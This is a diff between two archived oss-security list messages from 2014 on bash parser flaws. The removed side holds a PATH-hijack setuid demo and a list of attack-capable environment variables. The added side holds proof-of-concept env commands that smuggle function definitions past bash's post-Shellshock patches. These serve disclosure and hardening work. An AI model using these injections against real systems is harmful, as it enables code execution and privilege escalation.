@@ -1,57 +1,44 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/09/30/26
-Message-ID: <542AC920.3080600@debian.org>
-Date: Tue, 30 Sep 2014 16:15:44 +0100
-From: Simon McVittie <smcv@...ian.org>
-To: oss-security@...ts.openwall.com
-Subject: Re: Healing the bash fork
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/02/2
+Message-ID: <B3A9C97F-6AE4-4AF4-B9C0-567B158B58EA@akamai.com>
+Date: Wed, 1 Oct 2014 19:16:40 -0500
+From: "Kobrin, Eric" <ekobrin@...mai.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: Re: More parser odities
 Content-Type: text/plain; charset=utf-8
 
-On 30/09/14 15:27, Michal Zalewski wrote:
->> Florian's prefix/suffix patch is not going to protect against the
->> setuid/setgid exploit that I reported to this list last week.
-...
->> http://technicalprose.blogspot.co.uk/2014/09/shellshock-bug-third-vulnerability.html
->
-> You do realize that your setuid program is patently unsafe, right?
-> Say:
+This oddity also allows bypass of the absolute_program protection added in the recent patches:
+
+$ env $'BASH_FUNC_#badname%%'=$'() { :; }\n/bin/ls () { echo wrongfunc; }  ' ./bash -c '/bin/ls'
+fbash: error importing function definition for `#badname'
+wrongfunc
+
+
+I really do think it is time to take a different approach for a long-term solution.
+
+-- Eric Kobrin
+
+On Oct 1, 2014, at 5:35 PM, "Kobrin, Eric" <ekobrin@...mai.com> wrote:
+
+> Using bash from the GNU git, subsequently patched to level 28:
 > 
-> $ echo -e '#!/bin/sh\necho pwn3d' >date;chmod 755 date;PATH=.:$PWD 
-> ./setuid_program
-> pwn3d
+> $ env $'BASH_FUNC_#badname%%'=$'() { :; }\nfoo () { echo wrongfunc; } ' ./bash -c 'foo'
+> ./bash: error importing function definition for `#badname'
+> wrongfunc
+> 
+> 
+> This is an artifact of the name and value being passed directly to parse_and_execute, separated by a space. Structures started in the name such as comments, quoted strings, etc. are allowed to continue into the body. Some of the existing safety checks stop the obvious attacks, but things like this can still get through.
+> 
+> 
+> I don't know of a safe way to pass the contents of an environment variable to parse_and_execute. Has anyone worked on a simplified grammar which could be more rigorously checked?
+> 
+> If there were one, with a parser called bash-simple-parse in following example, this problem would be easier to manage.
+> 
+> This way `function f() {...}' can be parsed, but `export -f f' could store a version of the function readable by bash-simple-parse. The function importer can then call bash-simple-parse and extract a function definition, knowing that nothing other than a function definition (not even the name) will be returned. That result can then be bound to the name provided, directly in the variable setup function without ever invoking the general parser.
+> 
+> Thoughts?
+> 
+> -- Eric Kobrin
+> 
+> 
 
-Other ways to attack this "simple, easy and wrong" setuid program
-include LD_PRELOAD and, depending on implementation details, any of:
-
-LD_LIBRARY_PATH (if sh(1) and/or date(1) is dynamically-linked)
-ENV (if sh(1) is ksh, at least according to sudo source code)
-BASH_ENV (if sh(1) is bash)
-PYTHONPATH (if you replace date(1) with any Python script)
-PERL5LIB (if you replace date(1) with any Perl script)
-DBUS_SESSION_BUS_ADDRESS (if you replace date(1) with something that
-uses D-Bus)
-...
-
-and that's without getting into odd corners of Unix which are not
-directly executed, but can be used to construct a more subtle
-vulnerability (e.g. IFS).
-
-Several of these are "disarmed" if ruid != euid (e.g. D-Bus, to address
-CVE-2012-3524), but by calling setresuid() you lost that protection. If
-you're going to do that, there is little that libraries or executables
-can do to save you.
-
-sudo attempts to have a comprehensive blacklist (plugins/sudoers/env.c
-in my copy) but IMO, its length demonstrates that any blacklist-based
-approach is unsustainable. I continue to believe that any setuid program
-that executes non-trivial code without whitelist-filtering its
-environment is seriously flawed; and sh(1), as invoked by system(), is
-certainly non-trivial.
-
-Or to put it another way, executables that make themselves a privilege
-boundary can't trust what they receive from outside the boundary, and
-need to take responsibility for passing a sanitized version to things
-inside the boundary - doubly so if the things inside the boundary have
-no way to detect that a privilege boundary was ever crossed.
-
-    S
